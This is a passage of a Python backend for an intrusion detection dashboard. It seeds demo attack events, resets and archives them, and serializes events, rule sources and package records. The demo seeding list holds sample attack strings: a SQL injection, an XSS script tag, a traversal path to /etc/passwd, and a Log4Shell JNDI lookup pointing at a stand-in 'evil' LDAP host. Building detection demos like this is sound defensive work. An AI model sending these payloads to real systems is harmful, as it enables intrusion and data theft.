                },
                "attack_families": [
                    {
                        "id": attack_id,
                        "name_zh": _attack_type_label(attack_id),
                        "description": "Aggregated from seeded demo events",
                        "detected": count > 0,
                        "event_count": int(count),
                    }
                    for attack_id, count in by_attack.items()
                ],
            },
            "vectors": [
                {
                    "attack_type": row.attack_type,
                    "attack_type_label": _attack_type_label(row.attack_type),
                    "client_ip": row.client_ip,
                    "method": row.method,
                    "path": (row.path or "")[:200],
                    "risk_score": int(row.risk_score or 0),
                    "blocked": bool(row.blocked),
                }
                for row in rows
            ],
            "ai_analysis": "Demo aggregation report for the phase1 attack chain.",
        }
    }


@router.post("/demo/phase1")
def seed_demo_phase1(
    req: DemoSeedRequest | None = None,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    db.query(IDSEvent).filter(IDSEvent.action_taken.like("demo_seed_phase1::%")).delete(synchronize_session=False)
    db.commit()

    rows = [
        ("sql_injection", "GET", "/api/purchase?kw=1' OR '1'='1", "192.168.31.101", 92, 95, 1, "firewall_block"),
        ("xss", "GET", "/api/trace?keyword=<script>alert(1)</script>", "192.168.31.101", 84, 90, 1, "logical_block_only"),
        ("path_traversal", "GET", "/api/ids/detection/sample-submit/../../etc/passwd", "10.10.0.55", 88, 93, 1, "firewall_block"),
        ("cmd_injection", "POST", _SAMPLE_SUBMIT_EVENT_PATH, "10.10.0.55", 86, 91, 1, "logical_block_only"),
        ("jndi_injection", "GET", "/api/overview/screen?x=${jndi:ldap://evil/a}", "172.20.1.90", 95, 98, 1, "firewall_block"),
        ("prototype_pollution", "POST", "/api/ai/chat", "172.20.1.90", 66, 78, 0, "record_only"),
        ("scanner", "GET", "/.git/config", "45.90.12.8", 59, 73, 0, "record_only"),
        ("scanner", "GET", "/wp-login.php", "45.90.12.8", 74, 81, 1, "logical_block_only"),
    ]

    seeded: list[int] = []
    for attack_type, method, path, ip, score, confidence, blocked, action in rows:
        evt = IDSEvent(
            client_ip=ip,
            attack_type=attack_type,
            signature_matched=f"demo_signature::{attack_type}",
            method=method,
            path=path,
            query_snippet=path.split("?", 1)[-1] if "?" in path else "",
            body_snippet="demo payload from red team automated testing",
            user_agent="RedTeam-AutoScanner/1.0",
            headers_snippet="{'x-demo':'phase1'}",
            blocked=blocked,
            firewall_rule=(f"IDS-Block-{ip.replace('.', '-')}" if blocked else ""),
            archived=0,
            status="investigating",
            review_note="Automated attack chain sample",
            action_taken=f"seed_phase1::{action}",
            response_result="success" if blocked else "record_only",
            response_detail=action,
            risk_score=score,
            confidence=confidence,
            hit_count=2 if score >= 80 else 1,
            detect_detail='[{"attack":"automated_chain","source":"seed"}]',
            ai_risk_level=("high" if score >= 85 else ("medium" if score >= 70 else "low")),
            ai_confidence=max(65, confidence - 5),
            ai_analysis=(
                f"Detected {_attack_type_label(attack_type)} activity in the automated attack chain.\n"
                f"Impact: assessed risk score {score}.\n"
                f"Evidence: source_ip={ip}; path={path}.\n"
                "Recommendation: keep automated validation traffic isolated from routine operations."
            ),
        )
        evt.created_at = datetime.utcnow()
        evt.ai_analyzed_at = evt.created_at
        apply_source_metadata(
            evt,
            event_origin=DEMO_EVENT_ORIGIN,
            source_classification=SOURCE_CUSTOM_PROJECT,
            detector_family="web",
            detector_name="demo_phase1_seed",
            source_rule_id=f"demo_signature::{attack_type}",
            source_rule_name=attack_type,
            source_version="demo-phase1",
            source_freshness="current",
            occurred_at=evt.created_at,
        )
        db.add(evt)
        db.flush()
        seeded.append(evt.id)

    db.commit()
    if (req.auto_analyze if req else True) and settings.IDS_AI_ANALYSIS and is_llm_available() and seeded:
        run_ai_analysis_sync(seeded[0])
    return {"code": 200, "message": "Phase1 demo events created", "event_ids": seeded}


@router.post("/demo/phase2")
def seed_demo_phase2(
    req: DemoSeedRequest | None = None,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    db.query(IDSEvent).filter(IDSEvent.action_taken.like("demo_seed_phase2::%")).delete(synchronize_session=False)
    db.commit()

    now = datetime.utcnow()
    evt = IDSEvent(
        client_ip="172.16.9.23",
        attack_type="malware",
        signature_matched="demo_malware_upload::webshell",
        method="POST",
        path=_SAMPLE_SUBMIT_EVENT_PATH,
        query_snippet="filename=report.jsp",
        body_snippet="multipart/form-data; suspicious webshell payload detected",
        user_agent="Manual-Attack/Browser",
        headers_snippet="{'content-type':'multipart/form-data'}",
        blocked=1,
        firewall_rule="IDS-Block-172-16-9-23",
        archived=0,
        status="mitigated",
        review_note="Demo data: webshell upload interception",
        action_taken="demo_seed_phase2::firewall_block",
        response_result="success",
        response_detail="firewall_block",
        risk_score=97,
        confidence=99,
        hit_count=3,
        detect_detail='[{"attack":"webshell_upload","source":"seed"}]',
        ai_risk_level="high",
        ai_confidence=97,
        ai_analysis=(
            "Detected demo webshell upload event.\n"
            "Impact: simulated high-risk file upload.\n"
            "Evidence: upload endpoint and suspicious payload markers.\n"
            "Recommendation: keep demo file events isolated from real metrics."
        ),
    )
    evt.created_at = now
    evt.ai_analyzed_at = now
    apply_source_metadata(
        evt,
        event_origin=DEMO_EVENT_ORIGIN,
        source_classification=SOURCE_CUSTOM_PROJECT,
        detector_family="file",
        detector_name="demo_phase2_seed",
        source_rule_id="demo_malware_upload::webshell",
        source_rule_name="malware",
        source_version="demo-phase2",
        source_freshness="current",
        occurred_at=now,
    )
    db.add(evt)
    db.commit()
    db.refresh(evt)

    if (req.auto_analyze if req else True) and settings.IDS_AI_ANALYSIS and is_llm_available():
        run_ai_analysis_sync(evt.id)
    return {"code": 200, "message": "Phase2 demo event created", "event_id": evt.id}


@router.post("/demo/reset")
def reset_demo_events(
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    deleted = (
        db.query(IDSEvent)
        .filter(IDSEvent.event_origin == DEMO_EVENT_ORIGIN)
        .delete(synchronize_session=False)
    )
    db.commit()
    return {"code": 200, "message": f"Deleted {deleted} demo events", "deleted": deleted}


@router.post("/events/archive-batch")
def archive_batch(
    req: ArchiveBatchRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    event_ids = req.event_ids or []
    if not event_ids:
        return {"code": 200, "message": "No events selected", "archived": 0}
    db.query(IDSEvent).filter(IDSEvent.id.in_(event_ids)).update(
        {
            IDSEvent.archived: 1,
            IDSEvent.status: "closed",
            IDSEvent.response_result: "success",
            IDSEvent.response_detail: "archived_by_batch",
        },
        synchronize_session=False,
    )
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_event_archive_batch",
        target_type="ids_event_batch",
        target_id=",".join(str(event_id) for event_id in event_ids[:20]),
        detail=f"Archived {len(event_ids)} IDS events in one batch action.",
    )
    db.commit()
    return {"code": 200, "message": f"Archived {len(event_ids)} events", "archived": len(event_ids)}


def _find_correlated_ingested_event(
    db: Session,
    *,
    event_origin: str,
    event_fingerprint: str,
    correlation_key: str,
    occurred_at: datetime,
) -> IDSEvent | None:
    # Bound correlation to active recent incidents so review stays manageable.
    review_window_start = occurred_at - timedelta(hours=24)
    q = (
        db.query(IDSEvent)
        .filter(IDSEvent.archived == 0)
        .filter(IDSEvent.event_origin == event_origin)
        .filter(IDSEvent.created_at >= review_window_start)
    )
    if event_fingerprint:
        evt = q.filter(IDSEvent.event_fingerprint == event_fingerprint).order_by(IDSEvent.id.desc()).first()
        if evt:
            return evt
    if correlation_key:
        evt = q.filter(IDSEvent.correlation_key == correlation_key).order_by(IDSEvent.id.desc()).first()
        if evt:
            return evt
    return None


def _merge_ingested_event(
    evt: IDSEvent,
    *,
    req: IngestEventRequest,
    raw_evidence: IngestRawEvidence,
    event_fingerprint: str,
    correlation_key: str,
):
    is_blocked = bool(req.blocked)
    response_result = (req.response_result or "").strip()[:32]
    action_taken = (req.action_taken or "").strip()[:128]
    firewall_rule = (req.firewall_rule or "").strip()[:256]

    evt.hit_count = int(evt.hit_count or 0) + 1
    evt.risk_score = max(int(evt.risk_score or 0), _severity_to_risk_score(req.severity, req.confidence))
    evt.confidence = max(int(evt.confidence or 0), int(req.confidence or 0))
    evt.signature_matched = (req.rule_name or req.rule_id or evt.signature_matched or "")[:128]
    evt.blocked = 1 if (int(evt.blocked or 0) or is_blocked) else 0
    if firewall_rule:
        evt.firewall_rule = firewall_rule
    evt.response_result = response_result or ("success" if is_blocked else (evt.response_result or "record_only"))
    evt.response_detail = (req.evidence_summary or evt.response_detail or "ingest_correlated")[:1000]
    evt.action_taken = action_taken or f"ingested::{req.source_classification}::correlated"
    if raw_evidence.method:
        evt.method = raw_evidence.method[:16].upper()
    if raw_evidence.path or req.asset_ref:
        evt.path = (raw_evidence.path or req.asset_ref)[:512]
    if raw_evidence.query_snippet:
        evt.query_snippet = raw_evidence.query_snippet[:500]
    if raw_evidence.body_snippet:
        evt.body_snippet = raw_evidence.body_snippet[:500]
    if raw_evidence.user_agent:
        evt.user_agent = raw_evidence.user_agent[:512]
    if raw_evidence.headers_snippet:
        evt.headers_snippet = raw_evidence.headers_snippet[:1000]
    evt.detect_detail = _build_ingested_detect_detail(req, raw_evidence)
    apply_source_metadata(
        evt,
        event_origin=req.event_origin,
        source_classification=req.source_classification,
        detector_family=req.detector_family,
        detector_name=req.detector_name,
        source_rule_id=req.rule_id,
        source_rule_name=req.rule_name,
        source_version=req.source_version,
        source_freshness=req.source_freshness,
        occurred_at=req.occurred_at,
        event_fingerprint=event_fingerprint,
        correlation_key=correlation_key,
    )


def _severity_to_risk_score(severity: str | None, confidence: int | None) -> int:
    base = {
        "low": 35,
        "medium": 60,
        "high": 82,
        "critical": 96,
    }.get((severity or "").strip().lower(), 60)
    confidence_score = max(0, min(100, int(confidence or 0)))
    return max(base, confidence_score)


def _build_ingested_detect_detail(req: IngestEventRequest, raw_evidence: IngestRawEvidence) -> str:
    summary = (req.evidence_summary or "").strip()
    detail_parts = [
        f"origin={req.event_origin}",
        f"source={req.source_classification}",
        f"detector={req.detector_name}",
        f"rule_id={req.rule_id or '-'}",
        f"rule_name={req.rule_name or '-'}",
        f"severity={req.severity or '-'}",
        f"summary={summary or '-'}",
        f"method={(raw_evidence.method or '').strip().upper() or '-'}",
        f"path={(raw_evidence.path or req.asset_ref or '').strip() or '-'}",
    ]
    return " | ".join(detail_parts)[:4000]


def _filtered_ids_query(
    db: Session,
    *,
    attack_type: str | None = None,
    client_ip: str | None = None,
    blocked: int | None = None,
    archived: int | None = None,
    status: str | None = None,
    event_origin: str | None = None,
    source_classification: str | None = None,
    min_score: int | None = None,
):
    q = db.query(IDSEvent)
    if attack_type:
        q = q.filter(IDSEvent.attack_type == attack_type)
    if client_ip:
        q = q.filter(IDSEvent.client_ip.contains(client_ip))
    if blocked is not None:
        q = q.filter(IDSEvent.blocked == blocked)
    if archived is not None:
        q = q.filter(IDSEvent.archived == archived)
    if status:
        q = q.filter(IDSEvent.status == status)
    if event_origin:
        q = q.filter(IDSEvent.event_origin == event_origin)
    if source_classification:
        q = q.filter(IDSEvent.source_classification == source_classification)
    if min_score is not None:
        q = q.filter(IDSEvent.risk_score >= min_score)
    return q


def _get_event_or_404(db: Session, event_id: int) -> IDSEvent:
    evt = db.query(IDSEvent).filter(IDSEvent.id == event_id).first()
    if not evt:
        raise HTTPException(status_code=404, detail="Event not found")
    return evt


def _attack_type_label(attack_type: str | None) -> str:
    labels = {
        "sql_injection": "SQL Injection",
        "xss": "XSS",
        "xxe": "XXE",
        "xml_external_entity": "XXE",
        "path_traversal": "Path Traversal",
        "cmd_injection": "Command Injection",
        "command_injection": "Command Injection",
        "scanner": "Scanner / Probe",
        "malformed": "Malformed Request",
        "jndi_injection": "JNDI / Log4Shell",
        "prototype_pollution": "Prototype Pollution",
        "malware": "Malware / WebShell",
        "recon_finding": "Scanner / Probe",
        "recon_port_exposure": "Scanner / Probe",
        "recon_nday_candidate": "Scanner / Probe",
        "recon_security_header_gap": "Scanner / Probe",
        "recon_js_secret_hint": "Scanner / Probe",
        "recon_login_surface": "Scanner / Probe",
        "recon_sensitive_function": "Scanner / Probe",
        "demo_attack_detected": "Scanner / Probe",
        "demo_defense_effective": "Protective Action",
        "suspicious_attack_activity": "Scanner / Probe",
        "protective_containment_action": "Protective Action",
    }
    return labels.get(attack_type or "", attack_type or "-")


def _event_origin_label(origin: str | None) -> str:
    labels = {"real": "Real", "demo": "Demo", "test": "Test"}
    return labels.get((origin or "").strip(), origin or REAL_EVENT_ORIGIN)


def _format_duration(total_seconds: int) -> str:
    total_seconds = max(0, int(total_seconds))
    hours = total_seconds // 3600
    minutes = (total_seconds % 3600) // 60
    seconds = total_seconds % 60
    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"


def _derive_location_from_ip(client_ip: str | None) -> dict[str, object]:
    if not client_ip:
        point = _SITUATION_GEO_POINTS[0]
    else:
        digest = hashlib.md5(client_ip.encode("utf-8")).hexdigest()
        index = int(digest[:8], 16) % len(_SITUATION_GEO_POINTS)
        point = _SITUATION_GEO_POINTS[index]
    return {
        "country": point["country"],
        "city": point["city"],
        "lat": point["lat"],
        "lng": point["lng"],
        "derived": True,
    }


def _situation_severity(row: IDSEvent) -> str:
    score = int(row.risk_score or 0)
    if score >= 85:
        return "致命"
    if score >= 70:
        return "高危"
    if score >= 45:
        return "中危"
    return "低危"


def _situation_status(row: IDSEvent) -> str:
    if row.blocked == 1:
        return "已阻断"
    if (row.status or "").strip() in {"investigating", "new"}:
        return "研判中"
    if (row.status or "").strip() == "mitigated":
        return "已缓解"
    return "已记录"


def _serialize_situation_attack(row: IDSEvent) -> dict[str, object]:
    location = _derive_location_from_ip(row.client_ip)
    created_at = row.created_at.strftime("%Y-%m-%d %H:%M:%S") if row.created_at else ""
    return {
        "id": str(row.id),
        "timestamp": created_at,
        "source_ip": row.client_ip or "-",
        "source_location": location,
        "target_ip": _TARGET_LOCATION["ip"],
        "target_location": {"lat": _TARGET_LOCATION["lat"], "lng": _TARGET_LOCATION["lng"]},
        "attack_type": _attack_type_label(row.attack_type),
        "severity": _situation_severity(row),
        "status": _situation_status(row),
        "blocked": bool(row.blocked),
        "detector_name": row.detector_name or "",
        "uptime": _format_duration((datetime.utcnow() - _SITUATION_SERVICE_STARTED_AT).total_seconds()),
    }


def _get_source_or_404(db: Session, source_id: int) -> IDSSource:
    source = db.query(IDSSource).filter(IDSSource.id == source_id).first()
    if not source:
        raise HTTPException(status_code=404, detail="Source not found")
    return source


def _validate_source_registry_request(
    req: SourceRegistryRequest,
    *,
    db: Session,
    source_id: int | None = None,
) -> dict:
    source_key = normalize_source_key(req.source_key)
    display_name = (req.display_name or "").strip()[:128]
    trust_classification = (req.trust_classification or "").strip()
    detector_family = (req.detector_family or "").strip()[:32]
    operational_status = (req.operational_status or "").strip()
    sync_mode = (req.sync_mode or "").strip()
    sync_endpoint = (req.sync_endpoint or "").strip()[:255]
    provenance_note = (req.provenance_note or "").strip()[:2000]

    if not source_key:
        raise HTTPException(status_code=400, detail="source_key is required")
    if not display_name:
        raise HTTPException(status_code=400, detail="display_name is required")
    if trust_classification not in TRUST_CLASSIFICATIONS:
        raise HTTPException(status_code=400, detail=f"Invalid trust_classification: {trust_classification}")
    if not detector_family:
        raise HTTPException(status_code=400, detail="detector_family is required")
    if operational_status not in OPERATIONAL_STATUSES:
        raise HTTPException(status_code=400, detail=f"Invalid operational_status: {operational_status}")
    if sync_mode not in SYNC_MODES:
        raise HTTPException(status_code=400, detail=f"Invalid sync_mode: {sync_mode}")
    if trust_classification == SOURCE_DEMO_TEST and sync_mode != SYNC_MODE_NOT_APPLICABLE:
        raise HTTPException(status_code=400, detail="demo_test sources must use sync_mode=not_applicable")
    if sync_mode != SYNC_MODE_NOT_APPLICABLE and not sync_endpoint:
        raise HTTPException(status_code=400, detail="sync_endpoint is required unless sync_mode=not_applicable")

    existing = db.query(IDSSource).filter(IDSSource.source_key == source_key).first()
    if existing and existing.id != source_id:
        raise HTTPException(status_code=400, detail=f"source_key already exists: {source_key}")

    return {
        "source_key": source_key,
        "display_name": display_name,
        "trust_classification": trust_classification,
        "detector_family": detector_family,
        "operational_status": operational_status,
        "freshness_target_hours": int(req.freshness_target_hours),
        "sync_mode": sync_mode,
        "sync_endpoint": sync_endpoint if sync_mode != SYNC_MODE_NOT_APPLICABLE else "",
        "provenance_note": provenance_note,
    }


def _format_dt(value: datetime | None) -> str | None:
    return value.strftime("%Y-%m-%d %H:%M:%S") if value else None


def _safe_parse_json_object(raw: str | None) -> dict[str, Any] | None:
    text = (raw or "").strip()
    if not text:
        return None
    try:
        payload = json.loads(text)
    except json.JSONDecodeError:
        return None
    return payload if isinstance(payload, dict) else None


def _safe_parse_json_list(raw: str | None) -> list[Any] | None:
    text = (raw or "").strip()
    if not text:
        return None
    try:
        payload = json.loads(text)
    except json.JSONDecodeError:
        return None
    return payload if isinstance(payload, list) else None


def _parse_headers_snippet(raw: str | None) -> list[dict[str, str]]:
    text = (raw or "").strip()
    if not text:
        return []
    try:
        payload = ast.literal_eval(text)
    except (SyntaxError, ValueError):
        payload = None
    if isinstance(payload, dict):
        return [
            {
                "name": str(key).strip()[:64],
                "value": str(value).strip()[:255],
            }
            for key, value in list(payload.items())[:12]
            if str(key).strip()
        ]
    return [{"name": "raw", "value": text[:255]}]


def _request_match_context(pattern: str, row: IDSEvent) -> tuple[str, str]:
    needle = (pattern or "").strip()
    if not needle:
        return "", ""
    lowered = needle.lower()
    candidates = [
        ("path", row.path or ""),
        ("query", row.query_snippet or ""),
        ("body", row.body_snippet or ""),
        ("headers", row.headers_snippet or ""),
        ("user_agent", row.user_agent or ""),
    ]
    for part, source in candidates:
        haystack = str(source or "")
        pos = haystack.lower().find(lowered)
        if pos < 0:
            continue
        start = max(0, pos - 60)
        end = min(len(haystack), pos + len(needle) + 120)
        return part, haystack[start:end]
    return "", ""


def _extract_event_hits(row: IDSEvent) -> list[dict[str, Any]]:
    payload = _safe_parse_json_list(row.detect_detail)
    if not payload:
        return []
    hits: list[dict[str, Any]] = []
    for index, item in enumerate(payload[:12], start=1):
        if not isinstance(item, dict):
            continue
        pattern = str(item.get("pattern") or "")[:255]
        matched_part, matched_value = _request_match_context(pattern, row)
        hits.append(
            {
                "id": f"{row.id}-{index}",
                "attack_type": str(item.get("attack_type") or row.attack_type or "")[:64],
                "pattern": pattern[:120],
                "signature_matched": str(item.get("signature_matched") or pattern)[:160],
                "weight": max(0, min(100, int(item.get("weight") or 0))),
                "runtime_priority": int(item.get("runtime_priority") or 0),
                "source_classification": str(item.get("source_classification") or row.source_classification or "")[:32],
                "detector_family": str(item.get("detector_family") or row.detector_family or "")[:32],
                "detector_name": str(item.get("detector_name") or row.detector_name or "")[:64],
                "source_rule_id": str(item.get("source_rule_id") or row.source_rule_id or "")[:128],
                "source_rule_name": str(item.get("source_rule_name") or row.source_rule_name or "")[:128],
                "source_version": str(item.get("source_version") or row.source_version or "")[:64],
                "source_freshness": str(item.get("source_freshness") or row.source_freshness or "")[:16],
                "matched_part": matched_part,
                "matched_value": matched_value[:255],
            }
        )
    return hits


def _build_request_packet(row: IDSEvent) -> dict[str, Any]:
    query_string = (row.query_snippet or "")[:500]
    method = (row.method or "GET").upper()
    path = (row.path or "")[:512]
    request_target = path or "/"
    if query_string and "?" not in request_target:
        request_target = f"{request_target}?{query_string[:240]}"
    request_line = f"{method} {request_target[:420]} HTTP/1.1"
    headers = _parse_headers_snippet(row.headers_snippet)
    body = (row.body_snippet or "")[:500]
    header_lines = [f"{item['name']}: {item['value']}" for item in headers[:12]]
    if not header_lines and (row.user_agent or "").strip():
        header_lines.append(f"User-Agent: {(row.user_agent or '')[:240]}")
    raw_request = "\n".join([request_line, *header_lines, "", body]).strip()
    return {
        "request_line": request_line,
        "method": method,
        "path": path,
        "query_string": query_string,
        "body": body,
        "headers": headers,
        "headers_snippet": (row.headers_snippet or "")[:1000],
        "user_agent": (row.user_agent or "")[:240],
        "raw_request": raw_request[:2000],
        "body_truncated": len(row.body_snippet or "") >= 500,
        "headers_truncated": len(row.headers_snippet or "") >= 1000,
    }


def _ai_status(row: IDSEvent) -> dict[str, Any]:
    ai_available = bool(settings.IDS_AI_ANALYSIS and is_llm_available())
    llm_used = bool((row.ai_analysis or "").strip() and row.ai_analyzed_at)
    if llm_used:
        analysis_mode = "llm_assisted"
        analysis_mode_label = "Static block + AI analysis"
        mode_reason = "analysis_completed"
    elif ai_available:
        analysis_mode = "static_only"
        analysis_mode_label = "Static block, AI available"
        mode_reason = "analysis_not_run"
    elif settings.IDS_AI_ANALYSIS:
        analysis_mode = "static_only"
        analysis_mode_label = "Static block only"
        mode_reason = "llm_not_ready"
    else:
        analysis_mode = "static_only"
        analysis_mode_label = "Static block only"
        mode_reason = "ids_ai_disabled"
    return {
        "analysis_mode": analysis_mode,
        "analysis_mode_label": analysis_mode_label,
        "mode_reason": mode_reason,
        "llm_used": llm_used,
        "ai_available": ai_available,
        "ai_risk_level": row.ai_risk_level or "",
        "ai_confidence": int(row.ai_confidence or 0),
        "ai_analyzed_at": row.ai_analyzed_at.strftime("%Y-%m-%d %H:%M:%S") if row.ai_analyzed_at else None,
    }


def _decision_basis(row: IDSEvent, hits: list[dict[str, Any]]) -> dict[str, Any]:
    ai_meta = _ai_status(row)
    external_hits = any((hit.get("runtime_priority") or 0) > 0 for hit in hits)
    static_source_mode = "external_runtime" if external_hits or (row.source_classification or "") == SOURCE_EXTERNAL_MATURE else "legacy_local"
    static_source_label = "External static rules" if static_source_mode == "external_runtime" else "Local legacy signatures"
    return {
        "final_source": "hybrid" if ai_meta.get("llm_used") else "static",
        "static_source_mode": static_source_mode,
        "static_source_label": static_source_label,
        "analysis_mode": ai_meta["analysis_mode"],
        "analysis_mode_label": ai_meta["analysis_mode_label"],
        "mode_reason": ai_meta["mode_reason"],
        "static_risk_score": int(row.risk_score or 0),
        "block_threshold": int(settings.IDS_BLOCK_THRESHOLD),
        "rule_confidence": int(row.confidence or 0),
        "llm_used": bool(ai_meta["llm_used"]),
        "ai_available": bool(ai_meta["ai_available"]),
        "ai_risk_level": row.ai_risk_level or "",
        "ai_confidence": int(row.ai_confidence or 0),
    }


def _extract_upload_saved_as(body_snippet: str | None) -> str:
    snippet = body_snippet or ""
    match = re.search(r"saved_as=([^;\\s]+)", snippet)
    return match.group(1)[:255] if match else ""


def _extract_upload_sha256(body_snippet: str | None) -> str:
    snippet = body_snippet or ""
    match = re.search(r"sha256=([0-9a-fA-F]{16,64})", snippet)
    return match.group(1).lower()[:64] if match else ""


def _extract_upload_trace(row: IDSEvent) -> dict[str, Any] | None:
    looks_like_upload_gate = (
        (row.detector_name or "") in {"upload_ai_gate", "upload_audit_gate"}
        or (row.action_taken or "").startswith("upload::")
        or (row.path or "") in {"/api/upload", _SAMPLE_SUBMIT_EVENT_PATH}
    )
    payload = _safe_parse_json_object(row.detect_detail)
    if not looks_like_upload_gate and not payload:
        return None

    audit = payload.get("audit") if isinstance(payload, dict) and isinstance(payload.get("audit"), dict) else {}
    raw_indicators = payload.get("indicators") if isinstance(payload, dict) and isinstance(payload.get("indicators"), list) else []
    indicators = []
    for item in raw_indicators[:6]:
        if isinstance(item, dict):
            indicators.append(
                {
                    "code": str(item.get("code") or "")[:64],
                    "detail": str(item.get("detail") or "")[:255],
                }
            )

    saved_as = str((payload or {}).get("saved_as") or _extract_upload_saved_as(row.body_snippet) or "")[:255]
    file_name = str((payload or {}).get("file_name") or "")[:255]
    sha256 = str((payload or {}).get("sha256") or _extract_upload_sha256(row.body_snippet) or "")[:64]
    summary = str(audit.get("summary") or row.response_detail or "")[:1000]
    if not any([saved_as, file_name, sha256, summary, indicators]):
        return None

    return {
        "saved_as": saved_as,
        "file_name": file_name,
        "sha256": sha256,
        "size": int((payload or {}).get("size") or 0),
        "storage_location": str((payload or {}).get("storage_location") or "quarantine")[:64],
        "indicator_count": len(raw_indicators),
        "indicators": indicators,
        "audit": {
            "verdict": str(audit.get("verdict") or row.response_result or "")[:32],
            "risk_level": str(audit.get("risk_level") or row.ai_risk_level or "")[:32],
            "confidence": max(0, min(100, int(audit.get("confidence") or row.ai_confidence or row.confidence or 0))),
            "summary": summary,
            "provider": str(audit.get("provider") or audit.get("engine") or row.source_version or "")[:128],
            "analysis_mode": str(audit.get("analysis_mode") or "")[:32],
            "analysis_mode_label": str(audit.get("analysis_mode_label") or "")[:32],
            "mode_reason": str(audit.get("mode_reason") or "")[:64],
            "llm_used": bool(audit.get("llm_used")),
            "ai_available": bool(audit.get("ai_available")),
            "reasons": [
                str(reason).strip()[:255]
                for reason in (audit.get("reasons") or audit.get("evidence") or [])
                if str(reason).strip()
            ][:6],
            "recommended_actions": [
                str(action).strip()[:255]
                for action in (audit.get("recommended_actions") or [])
                if str(action).strip()
            ][:5],
            "static_risk_level": str(audit.get("static_risk_level") or "")[:32],
            "heuristic_risk_level": str(audit.get("heuristic_risk_level") or "")[:32],
            "heuristic_verdict": str(audit.get("heuristic_verdict") or "")[:32],
            "linked_event_id": int(audit.get("linked_event_id") or 0) or None,
        },
        "decision_basis": payload.get("decision_basis") if isinstance(payload, dict) and isinstance(payload.get("decision_basis"), dict) else None,
    }


def _serialize_source_sync_attempt(attempt: IDSSourceSyncAttempt) -> dict:
    return {
        "id": attempt.id,
        "source_id": attempt.source_id,
        "started_at": _format_dt(attempt.started_at),
        "finished_at": _format_dt(attempt.finished_at),
        "result_status": attempt.result_status or "",
        "detail": (attempt.detail or "")[:1000],
        "freshness_after_sync": attempt.freshness_after_sync or "",
        "package_version": attempt.package_version or "",
        "package_intake_id": attempt.package_intake_id,
        "resolved_sync_endpoint": attempt.resolved_sync_endpoint or "",
        "triggered_by": attempt.triggered_by or "",
    }


def _serialize_ids_source(
    source: IDSSource,
    *,
    activity: dict | None = None,
    attempts: list[IDSSourceSyncAttempt] | None = None,
    package_intakes: list[IDSSourcePackageIntake] | None = None,
    package_activation: IDSSourcePackageActivation | None = None,
) -> dict:
    activity = activity or {}
    attempts = attempts or []
    package_intakes = package_intakes or []
    health_state = derive_source_health_state(source)
    recent_count = int(activity.get("recent_incident_count") or 0)
    recent_last_seen = activity.get("recent_incident_last_seen_at")
    package_preview = build_package_preview_summary(
        source,
        package_version=package_intakes[0].package_version if package_intakes else "",
        release_timestamp=package_intakes[0].release_timestamp if package_intakes else None,
        provenance_note=package_intakes[0].provenance_note if package_intakes else "",
        active_activation=package_activation,
        artifact_path=package_intakes[0].artifact_path if package_intakes else "",
        artifact_sha256=package_intakes[0].artifact_sha256 if package_intakes else "",
        artifact_size_bytes=package_intakes[0].artifact_size_bytes if package_intakes else None,
        rule_count=package_intakes[0].rule_count if package_intakes else None,
    ) if package_intakes else None
    return {
        "id": source.id,
        "source_key": source.source_key or "",
        "display_name": source.display_name or "",
        "trust_classification": source.trust_classification or "",
        "detector_family": source.detector_family or "",
        "operational_status": source.operational_status or "",
        "freshness_target_hours": int(source.freshness_target_hours or 0),
        "sync_mode": source.sync_mode or "",
        "sync_endpoint": (source.sync_endpoint or "")[:255],
        "last_synced_at": _format_dt(source.last_synced_at),
        "last_sync_status": source.last_sync_status or "",
        "last_sync_detail": (source.last_sync_detail or "")[:1000],
        "health_state": health_state,
        "visible_warning": build_source_warning(source, health_state=health_state),
        "recent_incident_count": recent_count,
        "recent_incident_last_seen_at": _format_dt(recent_last_seen if isinstance(recent_last_seen, datetime) else None),
        "provenance_note": (source.provenance_note or "")[:2000],
        "is_production_trusted": is_trusted_production_source(source),
        "created_at": _format_dt(source.created_at),
        "updated_at": _format_dt(source.updated_at),
        "latest_sync_attempt": _serialize_source_sync_attempt(attempts[0]) if attempts else None,
        "recent_sync_attempts": [_serialize_source_sync_attempt(attempt) for attempt in attempts],
        "active_package_version": package_activation.package_version if package_activation else "",
        "active_package_activated_at": _format_dt(package_activation.activated_at) if package_activation else None,
        "active_package_activated_by": package_activation.activated_by if package_activation else "",
        "latest_package_preview": package_preview,
        "recent_package_intakes": [_serialize_source_package_intake(intake) for intake in package_intakes],
    }


def _serialize_source_package_intake(intake: IDSSourcePackageIntake) -> dict:
    return {
        "id": intake.id,
        "source_id": intake.source_id,
        "source_key": intake.source_key or "",
        "package_version": intake.package_version or "",
        "release_timestamp": _format_dt(intake.release_timestamp),
        "trust_classification": intake.trust_classification or "",
        "detector_family": intake.detector_family or "",
        "provenance_note": (intake.provenance_note or "")[:2000],
        "intake_result": intake.intake_result or "",
        "intake_detail": (intake.intake_detail or "")[:1000],
        "artifact_path": (intake.artifact_path or "")[:255],
        "artifact_sha256": (intake.artifact_sha256 or "")[:64],
        "artifact_size_bytes": int(intake.artifact_size_bytes or 0),
        "rule_count": int(intake.rule_count or 0),
        "triggered_by": intake.triggered_by or "",
        "created_at": _format_dt(intake.created_at),
    }


def _serialize_source_package_activation(activation: IDSSourcePackageActivation) -> dict:
    return {
        "id": activation.id,
        "source_id": activation.source_id,
        "package_intake_id": activation.package_intake_id,
        "package_version": activation.package_version or "",
        "activated_at": _format_dt(activation.activated_at),
        "activated_by": activation.activated_by or "",
        "activation_detail": (activation.activation_detail or "")[:1000],
        "created_at": _format_dt(activation.created_at),
    }


def _build_source_package_history_item(
    source: IDSSource,
    *,
    intakes: list[IDSSourcePackageIntake],
    activations: list[IDSSourcePackageActivation],
) -> dict:
    latest_activation = activations[0] if activations else None
    return {
        "source": {
            "id": source.id,
            "source_key": source.source_key or "",
            "display_name": source.display_name or "",
            "trust_classification": source.trust_classification or "",
            "detector_family": source.detector_family or "",
        },
        "source_key": source.source_key or "",
        "active_package_version": latest_activation.package_version if latest_activation else "",
        "active_package_activated_at": _format_dt(latest_activation.activated_at) if latest_activation else None,
        "active_package_activated_by": latest_activation.activated_by if latest_activation else "",
        "recent_intakes": [_serialize_source_package_intake(intake) for intake in intakes],
        "recent_activations": [_serialize_source_package_activation(activation) for activation in activations],
    }


def _record_failed_package_activation(
